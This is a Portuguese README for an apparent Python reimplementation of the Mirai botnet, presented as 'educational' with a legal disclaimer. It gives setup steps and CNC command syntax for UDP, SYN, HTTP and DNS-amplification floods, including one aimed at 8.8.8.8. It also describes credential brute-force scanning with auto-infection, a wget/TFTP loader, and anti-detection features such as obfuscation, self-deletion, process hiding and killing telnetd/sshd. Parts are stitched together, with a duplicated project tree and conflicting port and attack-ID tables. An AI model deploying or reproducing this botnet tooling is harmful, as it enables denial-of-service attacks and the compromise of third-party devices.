# 🔥 Mirai-PTBR v1.0

> **Implementação educacional do Mirai Botnet em Python puro para testes de penetração e pesquisa de segurança.**

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Status](https://img.shields.io/badge/status-Active%20Development-brightgreen.svg)]()

---

## ⚠️ Aviso Legal

**USO EXCLUSIVO PARA PROFISSIONAIS DE SEGURANÇA AUTORIZADOS**

Este software é fornecido exclusivamente para:
- ✅ Testes de penetração autorizados
- ✅ Pesquisa de segurança em ambientes controlados
- ✅ Análise em laboratórios de segurança
- ✅ Fins educacionais com supervisão

O uso não autorizado é **ILEGAL** sob o Computer Fraud and Abuse Act (CFAA) e leis equivalentes em diversos países.

**Criadores originais do Mirai:** Paras Jha, Josiah White, Dalton Norman  
⚠️ Este projeto **NÃO é afiliado** aos autores originais.

---

## 📋 Visão Geral

**Mirai-PTBR** é um Mirai botnet completo reimplementado em **Python puro**, diferente do original que era C/ARM. Oferece:

✨ **Características principales:**
- 🎛️ **CNC Assíncrono** - Servidor asyncio na porta 7000
- 🤖 **Bot Multiplataforma** - Roda em qualquer SO com Python 3.8+
- 🔍 **Scanner Integrado** - SYN scan + brute force de 62 credenciais
- 💉 **Loader Automático** - Deploy via HTTP/TFTP/Echo
- ⚔️ **8+ Tipos de Ataque** - UDP, SYN, ACK, HTTP, DNS, VSE, etc.
- 🔐 **Ofuscação** - XOR, RC4, Base64 para strings sensíveis
- 📊 **CLI Interativa** - Interface completa para operador

---

## 🚀 Quick Start (5 minutos)

### 1️⃣ Instalação

```bash
# Clone e configure
git clone https://github.com/ghostn4444/Mirai.git
cd Mirai
python3 -m venv venv && source venv/bin/activate

# Instale dependências
pip install -r requirements.txt
mkdir -p bins logs

# Teste importações
python3 -c "import cnc, bot, scanner, attacks, loader; print('[+] Ready!')"
```

### 2️⃣ Terminal 1: Inicie o CNC

```bash
python3 main.py cnc --verbose
# [+] CNC Server rodando em 0.0.0.0:7000
# mirai>
```

### 3️⃣ Terminal 2: Conecte um Bot

```bash
python3 main.py bot --cnc-host 127.0.0.1 --cnc-port 7000
# [+] Conectado ao CNC!
# [*] Registrado como: bot-0x1a2b3c4d
```

### 4️⃣ Terminal 1 (CNC): Execute Comandos

```bash
mirai> status
[*] Bots conectados: 1
    └─ bot-0x1a2b3c4d (x86_64, 127.0.0.1)

mirai> attack UDP 192.168.1.50 80 60
[+] UDP Attack iniciado contra 192.168.1.50:80 por 60s

mirai> stop
[+] Ataque pausado
```

---

## 📚 Documentação

### 🔗 Recursos

| Documento | Conteúdo |
|-----------|----------|
| [**Docs.md**](Docs.md) | 📖 Documentação técnica completa (2000+ linhas) |
| [**README.md**](README.md) | 📄 Este arquivo - Quick start |
| [**CODE**](cnc/protocol.py) | 💻 Protocolo binário Mirai |

**Para informações detalhadas ➡️ [Abrir Docs.md](Docs.md)**

---

## 🏗️ Arquitetura

```
┌─────────────────────────────────────┐
│   CNC Server (asyncio)              │
│   Porta: 7000                       │
│   - Gerencia bots                   │
│   - Distribui ataques               │
│   - CLI interativa                  │
└────────────┬────────────────────────┘
             │
      ┌──────┴────────┬────────────┐
      │               │            │
   ┌──▼──┐       ┌────▼───┐   ┌───▼──┐
   │Bot  │       │Scanner │   │Loader│
   │(x3) │       │(threads)   │(HTTP)│
   └──┬──┘       └────┬───┘   └───┬──┘
      │               │            │
      └───────────────┼────────────┘
                      │
         ┌────────────▼──────────────┐
         │  Motores de Ataque DDoS   │
         │  - UDP Flood              │
         │  - SYN/ACK Flood          │
         │  - HTTP Flood             │
         │  - DNS Amplification      │
         │  - VSE Attack             │
         │  - etc                    │
         └───────────────────────────┘
```

---

## 📁 Estrutura do Projeto

```
mirai-ptbr/
├── main.py                     # Entry point unificado
├── requirements.txt            # Dependências
├── README.md                   # Este arquivo (quick start)
├── Docs.md                     # Documentação técnica completa
├── LICENSE                     # MIT License
│
├── cnc/                        # Command & Control
│   ├── server.py              # Servidor TCP asyncio
│   ├── protocol.py            # Protocolo binário
│   ├── attack.py              # Gerenciamento de ataques
│   ├── client.py              # CLI interativa
│   └── main.py                # Inicialização
│
├── bot/                        # Bot Client
│   ├── bot.py                 # Payload principal
│   ├── bot_minimal.py         # Versão minimalista
│   └── build.sh               # Script de compilação
│
├── scanner/                    # Scanner + Propagação
│   ├── scanner.py             # SYN scan + brute force
│   ├── creds.py               # 62 credenciais padrão
│   └── state_machine.py       # Máquina de estados TCP
│
├── loader/                     # Deploy Automático
│   ├── loader.py              # Gerenciador de deploy
│   ├── deploy.py              # Métodos (wget/tftp/echo)
│   ├── payload_builder.py    # Compilação de payloads
│   └── serve.py               # Servidor HTTP/TFTP
│
├── attacks/                    # Motores de Ataque
│   ├── main.py                # Router de ataques
│   ├── udp.py                 # UDP Flood
│   ├── syn.py                 # SYN/ACK Flood
│   ├── dns.py                 # DNS Amplification
│   ├── http.py                # HTTP Flood
│   ├── vse.py                 # VSE Attack
│   └── (mais vetores)
│
├── tools/                      # Ferramentas
│   ├── enc.py                 # Ofuscação XOR/RC4/Base64
│   └── config_builder.py      # Config ofuscada
│
└── (diretórios opcionais)
    ├── bins/                  # Binários compilados
    └── logs/                  # Logs de operação
```

---

## 🎮 Comandos CLI do CNC

```bash
# Status
mirai> status                    # Mostra bots conectados
mirai> bots                      # Lista detalhada de bots

# Ataques
mirai> attack UDP 192.168.1.1 80 60     # UDP Flood por 60s
mirai> attack SYN 10.0.0.1 443 300      # SYN Flood por 300s
mirai> attack HTTP http://alvo.com 120  # HTTP Flood por 120s
mirai> attack DNS 8.8.8.8 53 180        # DNS Amplification
mirai> stop                             # Para ataques

# Gerenciamento
mirai> kill bot-0x1a2b3c4d       # Encerra um bot
mirai> broadcast CMD             # Envia comando para todos
mirai> clear                      # Limpa tela
mirai> help                       # Ajuda
mirai> quit                       # Sai
```

Ver [**Docs.md > Interface CLI**](Docs.md#interface-cli-do-cnc) para detalhes completos.

---

## 🔧 Instalação Detalhada

### Pré-requisitos

```bash
# Python 3.8+
python3 --version

# pip
pip3 --version

# (Opcional) git
git --version
```

### Passos

```bash
# 1. Clone
git clone https://github.com/ghostn4444/Mirai.git
cd Mirai

# 2. Ambiente virtual (recomendado)
python3 -m venv venv
source venv/bin/activate

# 3. Instale dependências
pip install -r requirements.txt

# 4. Crie diretórios
mkdir -p bins logs configs

# 5. Teste
python3 main.py --help
```

### Dependências

```
scapy>=2.4.5      # Raw sockets para SYN/ACK/DNS
pyinstaller>=5.0  # (Opcional) Compilação de bot
```

Maioria usa **stdlib** do Python 3.8+.

---

## 📖 Tipos de Ataques

| ID | Nome | Porta | Descrição |
|----|----|-------|-----------|
| 0 | **UDP** | Variável | UDP Flood com payload aleatório |
| 1 | **SYN** | 23/80/443 | SYN Flood com IP spoofed |
| 2 | **ACK** | Variável | ACK Flood com IP spoofed |
| 3 | **HTTP** | 80/443 | HTTP GET/POST Flood |
| 4 | **DNS** | 53 | DNS Amplification (~60x) |
| 5 | **GREIP** | Variável | GRE Tunnel IP-in-IP |
| 6 | **GREETH** | Variável | GRE Tunnel Ethernet |
| 7 | **VSE** | 27015+ | Valve Source Engine |
| 8 | **STOMP** | 61613 | STOMP Protocol |

---

## 🛠️ Exemplos de Uso

### Exemplo 1: Ataque UDP Simples

```bash
# Terminal 1: CNC
python3 main.py cnc

# Terminal 2: Bot
python3 main.py bot

# Terminal 1: Ataque
mirai> attack UDP 192.168.1.50 80 30
[+] UDP Attack iniciado contra 192.168.1.50:80 por 30s
```

### Exemplo 2: Múltiplos Bots

```bash
# Terminal 2: Bot 1
python3 main.py bot --cnc-port 7000

# Terminal 3: Bot 2
python3 main.py bot --cnc-port 7000

# Terminal 4: Bot 3
python3 main.py bot --cnc-port 7000

# Terminal 1: Distribuir ataque
mirai> attack SYN 10.0.0.5 443 60
[+] Ataque distribuído para 3 bots
```

### Exemplo 3: DNS Amplification

```bash
mirai> attack DNS 8.8.8.8 53 180
[+] DNS Amplification contra 8.8.8.8 por 180s
# Amplificação ~60x com múltiplos bots
```

---

## 🔍 Troubleshooting

| Problema | Solução |
|----------|---------|
| "Port 7000 already in use" | `lsof -i :7000` / `kill -9 <PID>` ou usar `--port 8000` |
| Bot não conecta ao CNC | Verificar firewall, IP/porta corretos |
| "Permission denied" em SYN | Raw sockets requerem root: `sudo python3 main.py bot` |
| Scanner não encontra dispositivos | Verificar se porta 23 (Telnet) está aberta em rede alvo |

Ver [**Docs.md > Troubleshooting**](Docs.md#troubleshooting) para mais.

---

## 🧪 Desenvolvimento

### Adicionar Novo Tipo de Ataque

1. Criar arquivo em `attacks/novo_ataque.py`
2. Implementar função `novo_ataque()`
3. Registrar em `attacks/protocol.py` (classe `AttackType`)
4. Adicionar rota em `attacks/main.py`
5. Usar via CLI: `attack NOVO 192.168.1.1 80 60`

Ver [**Docs.md > Desenvolvimento**](Docs.md#desenvolvimento) para exemplos de código.

---

## 📞 Suporte

- 📖 **Documentação:** [Docs.md](Docs.md)
- 🐛 **Issues:** GitHub Issues (se disponível)
- 💬 **Discussões:** GitHub Discussions (se disponível)

---

## 📄 Licença

MIT License - Ver [LICENSE](LICENSE) para detalhes.

---

## 🎯 Features Planejadas

- [ ] Suporte a IPv6
- [ ] Criptografia de protocolo CNC
- [ ] Dashboard web de monitoramento
- [ ] Compilação automática de bot para ARM/MIPS
- [ ] Mais vetores de ataque (NTP, Smurf, etc)
- [ ] Persistência e auto-atualização de bot

---

## 📚 Referências

- [Mirai Original](https://github.com/jgamblin/Mirai-Source-Code)
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Raw Sockets](https://en.wikipedia.org/wiki/Raw_socket)
- [DDoS Vectors](https://owasp.org/www-community/attacks/Denial_of_Service)

---

**Desenvolvido para fins educacionais e pesquisa de segurança autorizada.**
│   ├── dns.py              # DNS amplification
│   ├── http.py             # HTTP GET/POST flood
│   └── vse.py              # Valve Source Engine query flood
│
├── scanner/                # Scanner de vulnerabilidades
│   ├── __init__.py
│   ├── scanner.py          # Scanner principal
│   ├── state_machine.py    # Máquina de estados
│   └── creds.py            # 62 credenciais padrão
│
├── loader/                 # Loader (deploy do bot)
│   ├── __init__.py
│   ├── loader.py           # Loader principal
│   ├── serve.py            # Servidores HTTP/TFTP
│   ├── arch.py             # Detectores de arquitetura
│   ├── deploy.py           # Métodos de deploy
│   └── payload_builder.py  # Construtores de payload
│
├── tools/                  # Ferramentas auxiliares
│   └── enc.py              # Ofuscação XOR/RC4/Base64
│
└── bins/                   # Binários compilados (criar)
    ├── arm
    ├── aarch64
    ├── mips
    ├── x86
    └── x86_64
```

---

## 🔧 Configuração

### Variáveis de Ambiente

| Variável             | Default   | Descrição                  |
|----------------------|-----------|----------------------------|
| **CNC_HOST**         | 127.0.0.1 | IP do servidor CNC         |
| **CNC_PORT**         | 48101     | Porta do CNC               |
| **BOT_ID**           | (auto)    | Identificador único do bot | 
| **LOADER_HTTP_PORT** | 8080      | Porta HTTP do loader       |
| **LOADER_TFTP_PORT** | 69        | Porta TFTP do loader       |

## Protocolo Binário (CNC ↔ Bot)

```bash
[4 bytes LE: duration] [1 byte: attack_type] [1 byte: targets_len] [targets...] [1 byte: opts_len] [opts...]

Handshake: bot envia "MIRA" + bot_id
Heartbeat: bot envia \x00 a cada 60s
Comando: CNC envia pacote AttackCommand
```

## Tipos de Ataque

| ID      | Nome         | Descrição                       |
|---------|--------------|---------------------------------|
| **0**   | UDP          | UDP flood (payload randômico)   |
| **1**   | SYN          | SYN/ACK flood (raw sockets)     |
| **2**   | DNS          | DNS amplification (ANY query)   | 
| **3**   | HTTP         | HTTP GET/POST flood             |
| **4**   | VSE          | Valve Source Engine query flood |
| **5-9** | (RESERVADIS) | Para expansão                   |

## 🧪 Cenários de Teste

### Laboratório Local

```bash
# Terminal 1: CNC
python main.py cnc

# Terminal 2: Scanner + Loader (rede local)
python main.py scan --network 192.168.1.0/24 --auto-infect

# Terminal 3: Bot manual
python main.py bot
```

### Teste de Resiliência

```
# Simula queda de CNC
# Bot reconecta automaticamente com backoff exponencial (1-60s)

# Mata bot e verifica auto-delete
# Single-instance lock evita múltiplas instâncias
```

## 🔒 Ofuscação

```bash
# Gera chave
python tools/enc.py --generate-key

# Ofusca string
python tools/enc.py string "meu.cnc.com" --key 0xDEADBEEF

# Ofusca porta
python tools/enc.py port 48101

# Gera tabela completa
python tools/enc.py --generate-table -o cnc/table.py

# Decofusca
python tools/enc.py --decrypt "a1b2c3..." --key 0xDEADBEEF
```

## 📊 Performance

| Operação              | Performance                     |
|-----------------------|---------------------------------|
| CNC (asyncio)         | ~10k bots simultâneos           |
| UDP flood (4 threads) | ~500 Mbps (depende do hardware) |
| Scanner (100 threads) | ~50k IPs/minuto                 |
| Loader                | 50 deploys simultâneos          |

## 🛡️ Anti-Detecção

* **Ofuscação XOR/RC4**: Strings sensíveis nunca em plaintext
* **Auto-delete**: Binário se remove após execução
* **Process hiding**: Nome aleatório em `/tmp/.XXXX`
* **Single-instance**: Lock file por hash do CNC
* **Killer**: Remove processos concorrentes (telnetd, sshd)
* **Backoff exponencial**: Evita flooding na reconexão


## 📚 Documentação

- `DOCS.md` [blocked] — Documentação técnica completa
- `tools/enc.py --help` — Ferramenta de ofuscação
- Código-fonte comentado em português

## ⚖️ Aviso Legal

Este software é exclusivamente para fins educacionais e de pesquisa em segurança. O uso para atacar sistemas sem autorização é crime em praticamente todas as jurisdições.

#### Você é responsável por:

1. Obter autorização explícita por escrito antes de qualquer teste
2. Cumprir todas as leis locais, estaduais e federais aplicáveis
3. Usar apenas em sistemas que você possui ou tem permissão para testar
4. Isolar testes em ambiente controlado (VMs, containeres)
     

## 📄 Licença

MIT License — Uso educacional e de pesquisa apenas.

